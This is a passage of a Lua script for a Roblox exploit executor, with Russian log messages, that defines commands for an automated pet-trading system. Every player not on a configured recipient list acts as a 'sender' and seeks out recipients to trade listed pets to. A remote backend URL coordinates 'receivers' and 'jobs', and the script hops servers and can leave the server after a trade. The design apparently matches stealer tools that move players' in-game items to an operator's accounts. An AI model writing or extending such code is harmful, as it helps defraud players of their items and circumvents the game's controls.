        -- Clear recipients list and add one player
        getgenv().Config.Recipients = {username}
        AddMessage("Target player set: " .. username, "info")
    end
    
    local function AddRecipient(username)
        -- Check if player is already in list
        for _, existingPlayer in pairs(getgenv().Config.Recipients) do
            if existingPlayer == username then
                AddMessage("Player " .. username .. " already in recipients list", "warning")
                return
            end
        end
        
        table.insert(getgenv().Config.Recipients, username)
        AddMessage("Recipient added: " .. username, "success")
    end
    
    local function RemoveRecipient(username)
        for i, player in pairs(getgenv().Config.Recipients) do
            if player == username then
                table.remove(getgenv().Config.Recipients, i)
                AddMessage("Recipient removed: " .. username, "warning")
                break
            end
        end
    end
    
    local function ShowRecipients()
        AddMessage("=== Recipients List ===", "info")
        for i, player in pairs(getgenv().Config.Recipients) do
            AddMessage(i .. ". " .. player, "info")
        end
        AddMessage("======================", "info")
    end
    
    local function AddPetToTradeList(petName)
        table.insert(getgenv().Config.PetsToTrade, petName)
        AddMessage("Pet added to trade list: " .. petName, "success")
    end
    
    local function RemovePetFromTradeList(petName)
        for i, pet in pairs(getgenv().Config.PetsToTrade) do
            if pet == petName then
                table.remove(getgenv().Config.PetsToTrade, i)
                AddMessage("Pet removed from trade list: " .. petName, "warning")
                break
            end
        end
    end
    
    local function ShowConfig()
        AddMessage("=== Auto Trade Configuration ===", "info")
        AddMessage("Status: " .. (getgenv().Config.Enabled and "Enabled" or "Disabled"), "info")
        AddMessage("Backend: " .. (getgenv().Config.UseBackend and "Enabled" or "Disabled"), "info")
        AddMessage("Auto Teleport: " .. (getgenv().Config.AutoTeleport and "Enabled" or "Disabled"), "info")
        AddMessage("Skip teleport without pets: " .. (getgenv().Config.SkipTeleportIfNoPets and "Enabled" or "Disabled"), "info")
        AddMessage("Leave server after trade: " .. (getgenv().Config.LeaveServerAfterTrade and "Enabled" or "Disabled"), "info")
        AddMessage("Backend URL: " .. getgenv().Config.BackendURL, "info")
        AddMessage("Recipients:", "info")
        for i, player in pairs(getgenv().Config.Recipients) do
            AddMessage(i .. ". " .. player, "info")
        end
        AddMessage("Pets for trading:", "info")
        for i, pet in pairs(getgenv().Config.PetsToTrade) do
            AddMessage(i .. ". " .. pet, "info")
        end
        AddMessage("=================================", "info")
    end
    
    local function ToggleBackend()
        getgenv().Config.UseBackend = not getgenv().Config.UseBackend
        AddMessage("Backend: " .. (getgenv().Config.UseBackend and "Enabled" or "Disabled"), "info")
    end
    
    local function ToggleAutoTeleport()
        getgenv().Config.AutoTeleport = not getgenv().Config.AutoTeleport
        AddMessage("Auto Teleport: " .. (getgenv().Config.AutoTeleport and "Enabled" or "Disabled"), "info")
    end
    
    local function ToggleRejoinMode()
        getgenv().Config.SmartServerSearch = not getgenv().Config.SmartServerSearch
        AddMessage("Rejoin вместо Smart Search: " .. (getgenv().Config.SmartServerSearch and "Enabled" or "Disabled"), "info")
    end
    
    local function PreviewBestServer()
        local best = FindBestPublicServer(126884695634066)
        if best then
            AddMessage("Best server preview: id=" .. tostring(best.id) .. ", players=" .. tostring(best.playing) .. "/" .. tostring(best.maxPlayers), "success")
        else
            AddMessage("Best server preview: not found", "warning")
        end
    end
    
    local function CheckBackendStatus()
        if not getgenv().Config.UseBackend then
            AddMessage("Backend disabled", "warning")
            return
        end
        
        local url = getgenv().Config.BackendURL .. "/api/stats"
        AddMessage("Backend: проверяем статус...", "info")
        
        local response = MakeHttpRequest(url, "GET")
        
        if response and response.success then
            AddMessage("=== Backend Status ===", "success")
            AddMessage("Active jobs: " .. (response.stats and response.stats.activeJobs or "N/A"), "info")
            AddMessage("Active receivers: " .. (response.stats and response.stats.activeReceivers or "N/A"), "info")
            AddMessage("Server time: " .. (response.stats and response.stats.serverTime or "N/A"), "info")
            AddMessage("=====================", "info")
        else
            AddMessage("Backend: ошибка подключения", "error")
            if response then
                AddMessage("Backend: ответ получен, но неверная структура", "warning")
            end
        end
    end
    
    local function RegisterReceiver()
        RegisterAsReceiver()
    end
    
    local function UnregisterReceiver()
        UnregisterAsReceiver()
    end
    
    local function UpdateReceiver()
        UpdateReceiverStatus()
    end
    
    local function CheckRole()
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        if isReceiver then
            AddMessage("Current role: Receiver (waiting for sender)", "success")
        else
            AddMessage("Current role: Sender (looking for receiver)", "info")
        end
    end
    
    local function CheckServerStatus()
        AddMessage("=== Статус сервера ===", "info")
        
        -- Проверяем доступность основных сервисов
        local jobId = game.JobId or "N/A"
        local placeId = game.PlaceId or "N/A"
        local players = game.Players and #game.Players:GetPlayers() or 0
        local maxPlayers = game.Players and game.Players.MaxPlayers or "N/A"
        
        AddMessage("Job ID: " .. tostring(jobId), "info")
        AddMessage("Place ID: " .. tostring(placeId), "info")
        
        -- Проверяем VIP статус
        local isVip = IsVipServer()
        AddMessage("VIP сервер: " .. (isVip and "Да" or "Нет"), "info")
        
        -- Проверяем заполненность
        local isFull = IsServerFull()
        AddMessage("Сервер полный: " .. (isFull and "Да" or "Нет"), "info")
        AddMessage("Игроков: " .. tostring(players) .. "/" .. tostring(maxPlayers), "info")
        
        -- Дополнительная информация о сервере
        if isVip then
            AddMessage("⚠️ ВНИМАНИЕ: VIP сервер обнаружен!", "warning")
            AddMessage("Рекомендуется переход на обычный сервер", "warning")
        end
        
        if isFull then
            AddMessage("⚠️ ВНИМАНИЕ: Сервер полный!", "warning")
            AddMessage("Рекомендуется переход на другой сервер", "warning")
        end
        
        -- Показываем информацию о памяти серверов
        if getgenv().ServerMemory then
            local memoryCount = 0
            for _ in pairs(getgenv().ServerMemory) do
                memoryCount = memoryCount + 1
            end
            
            if memoryCount > 0 then
                AddMessage("ServerMemory: запомнено " .. memoryCount .. " серверов", "info")
            end
        end
        
        AddMessage("=====================", "info")
    end
    
    local function ForceRejoinNormal()
        -- Проверяем, являемся ли мы получателем
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        if isReceiver then
            AddMessage("Принудительный переход на обычный сервер (получатель)...", "info")
            RejoinNormalServer()
        else
            AddMessage("Отправители не переходят на обычные серверы", "warning")
        end
    end
    
    local function CheckInventoryPets()
        AddMessage("=== Проверка питомцев в инвентаре ===", "info")
        
        -- Проверяем доступность персонажа
        local character = LocalPlayer.Character
        if not character then
            AddMessage("❌ Персонаж не загружен, ожидаем...", "warning")
            return
        end
        
        local petsInInventory = GetPetsInInventory()
        local petsCount = #petsInInventory
        AddMessage("Всего питомцев в инвентаре: " .. petsCount, "info")
        
        -- Проверяем переполнение для получателей
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        if isReceiver then
            if petsCount > 55 then
                AddMessage("⚠️ ПЕРЕПОЛНЕНИЕ ИНВЕНТАРЯ: " .. petsCount .. " питомцев!", "error")
                AddMessage("Получатель отключен от бекенда из-за переполнения (>55 питомцев)", "warning")
                AddMessage("Остаемся в игре, но не регистрируемся как получатель", "info")
                AddMessage("Рекомендуется освободить инвентарь для возобновления работы", "warning")
            elseif petsCount > 45 then
                AddMessage("⚠️ ВНИМАНИЕ: Инвентарь почти полный: " .. petsCount .. " питомцев", "warning")
                AddMessage("При достижении 55 питомцев получатель будет отключен от бекенда", "warning")
            else
                AddMessage("✅ Инвентарь в норме: " .. petsCount .. " питомцев", "success")
            end
        end
        
        if petsCount == 0 then
            AddMessage("❌ Нет питомцев в инвентаре!", "error")
            return
        end
        
        local tradePetsCount = 0
        local tradePetsList = {}
        
        for i, petData in pairs(petsInInventory) do
            if petData and petData.Name then
                local baseName = GetBasePetName(petData.Name)
                local isInTradeList = IsPetInTradeList(petData.Name)
                
                AddMessage(i .. ". " .. petData.Name .. " (основное имя: " .. baseName .. ")", "info")
                
                if isInTradeList then
                    AddMessage("   ✅ В списке трейда", "success")
                    tradePetsCount = tradePetsCount + 1
                    table.insert(tradePetsList, petData.Name)
                else
                    AddMessage("   ❌ НЕ в списке трейда", "warning")
                end
            else
                AddMessage(i .. ". Некорректные данные питомца", "error")
            end
        end
        
        AddMessage("=== Результат ===", "info")
        AddMessage("Питомцев для трейда: " .. tradePetsCount .. "/" .. petsCount, "info")
        
        if tradePetsCount > 0 then
            AddMessage("✅ Готов к трейду!", "success")
            AddMessage("Питомцы для трейда:", "info")
            for i, petName in pairs(tradePetsList) do
                AddMessage("  " .. i .. ". " .. petName, "info")
            end
        else
            AddMessage("❌ Нет питомцев для трейда!", "error")
            AddMessage("Добавьте питомцев в список трейда или получите нужных питомцев", "warning")
        end
        
        AddMessage("=======================", "info")
    end
    
    local function ToggleSkipTeleportIfNoPets()
        getgenv().Config.SkipTeleportIfNoPets = not getgenv().Config.SkipTeleportIfNoPets
        AddMessage("Пропуск телепорта без питомцев: " .. (getgenv().Config.SkipTeleportIfNoPets and "Включен" or "Выключен"), "info")
    end
    
    local function ToggleLeaveServerAfterTrade()
        getgenv().Config.LeaveServerAfterTrade = not getgenv().Config.LeaveServerAfterTrade
        AddMessage("Выход с сервера после трейда: " .. (getgenv().Config.LeaveServerAfterTrade and "Включен" or "Выключен"), "info")
    end
    
    local function ForceLeaveServer()
        -- Проверяем, являемся ли мы отправителем
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        if not isReceiver then
            AddMessage("Принудительный выход с сервера (отправитель)...", "info")
            LeaveServerAfterTrade()
        else
            AddMessage("Получатели не выходят с сервера принудительно", "warning")
        end
    end
    
    local function ShowServerMemory()
        AddMessage("=== Память о серверах ===", "info")
        
        if not getgenv().ServerMemory or not next(getgenv().ServerMemory) then
            AddMessage("Память о серверах пуста", "info")
            return
        end
        
        local currentTime = tick()
        for serverKey, serverData in pairs(getgenv().ServerMemory) do
            local age = math.floor(currentTime - serverData.timestamp)
            local ageText = age .. "с назад"
            
            if serverData.isNormal then
                AddMessage("Сервер: " .. serverKey .. " - ОБЫЧНЫЙ (было игроков: " .. (serverData.maxPlayersSeen or 0) .. ", " .. ageText .. ")", "success")
            elseif serverData.isVip then
                AddMessage("Сервер: " .. serverKey .. " - VIP (" .. (serverData.reason or "unknown") .. ", " .. ageText .. ")", "warning")
            else
                AddMessage("Сервер: " .. serverKey .. " - НЕИЗВЕСТНО (" .. ageText .. ")", "error")
            end
        end
        
        AddMessage("=======================", "info")
    end
    
    local function ClearServerMemory()
        if getgenv().ServerMemory then
            local count = 0
            for _ in pairs(getgenv().ServerMemory) do
                count = count + 1
            end
            
            getgenv().ServerMemory = {}
            AddMessage("Память о серверах очищена (" .. count .. " записей удалено)", "success")
        else
            AddMessage("Память о серверах уже пуста", "info")
        end
    end
    
    -- Глобальные команды
    _G.ToggleAutoTrade = ToggleAutoTrade
    _G.SetTargetPlayer = SetTargetPlayer
    _G.AddRecipient = AddRecipient
    _G.RemoveRecipient = RemoveRecipient
    _G.ShowRecipients = ShowRecipients
    _G.AddPetToTradeList = AddPetToTradeList
    _G.RemovePetFromTradeList = RemovePetFromTradeList
    _G.ShowConfig = ShowConfig
    _G.ToggleBackend = ToggleBackend
    _G.ToggleAutoTeleport = ToggleAutoTeleport
    _G.ToggleRejoinMode = ToggleRejoinMode
    _G.PreviewBestServer = PreviewBestServer
    _G.CheckBackendStatus = CheckBackendStatus
    _G.RegisterReceiver = RegisterReceiver
    _G.UnregisterReceiver = UnregisterReceiver
    _G.UpdateReceiver = UpdateReceiver
    _G.CheckRole = CheckRole
    _G.CheckServerStatus = CheckServerStatus
    _G.ForceRejoinNormal = ForceRejoinNormal
    _G.CheckInventoryPets = CheckInventoryPets
    _G.ToggleSkipTeleportIfNoPets = ToggleSkipTeleportIfNoPets
    _G.ToggleLeaveServerAfterTrade = ToggleLeaveServerAfterTrade
    _G.ForceLeaveServer = ForceLeaveServer
    _G.ShowServerMemory = ShowServerMemory
    _G.ClearServerMemory = ClearServerMemory
    
    AddMessage("=== Авто трейд скрипт загружен ===", "success")
    
    -- Проверяем роль текущего игрока
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    if isReceiver then
        AddMessage("РОЛЬ: Получатель (ожидаем отправителя)", "success")
    else
        AddMessage("РОЛЬ: Отправитель (ищем получателя)", "info")
    end
    for i, player in pairs(getgenv().Config.Recipients) do
        AddMessage(i .. ". " .. player, "info")
    end
    AddMessage("Текущий список питомцев для трейда:", "info")
    for i, pet in pairs(getgenv().Config.PetsToTrade) do
        AddMessage(i .. ". " .. pet, "info")
    end
    
    -- Показываем информацию о системе памяти серверов
    AddMessage("=== Система памяти серверов ===", "info")
    AddMessage("✅ Запоминает обычные серверы (где было >1 игрока)", "success")
    AddMessage("✅ Не переходит с обычных серверов, даже если все вышли", "success")
    AddMessage("✅ Автоматически очищает память каждые 5 минут", "success")
    AddMessage("✅ Команды: ShowServerMemory, ClearServerMemory", "info")
    AddMessage("=================================", "info")
    
    -- Проверяем статус бекенда при запуске
    if getgenv().Config.UseBackend then
        AddMessage("Запуск: проверяем статус бекенда...", "info")
        CheckBackendStatus()
    end
    
    -- Проверяем статус сервера при запуске
    task.wait(1) -- Небольшая задержка для загрузки
    AddMessage("Запуск: проверяем статус сервера...", "info")
    CheckServerStatus()
    
    -- Инициализируем память о серверах
    if not getgenv().ServerMemory then
        getgenv().ServerMemory = {}
        AddMessage("Запуск: память о серверах инициализирована", "info")
    end
    
    -- Проверяем роль и статус сервера при запуске
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    if isReceiver then
        -- Получатели переходят с VIP серверов
        if IsVipServer() then
            AddMessage("Запуск: получатель на VIP сервере, начинаем переход...", "warning")
            RejoinNormalServer()
        else
            AddMessage("Запуск: получатель на обычном сервере", "success")
        end
    else
        -- Отправители остаются на своих серверах
        if IsVipServer() then
            AddMessage("Запуск: отправитель на VIP сервере, остаемся", "info")
        else
            AddMessage("Запуск: отправитель на обычном сервере", "success")
        end
    end
    
    -- Проверяем питомцев в инвентаре при запуске
    task.wait(2) -- Ждем загрузки персонажа
    AddMessage("Запуск: проверяем питомцев в инвентаре...", "info")
    CheckInventoryPets()
end

CreateCommands() 
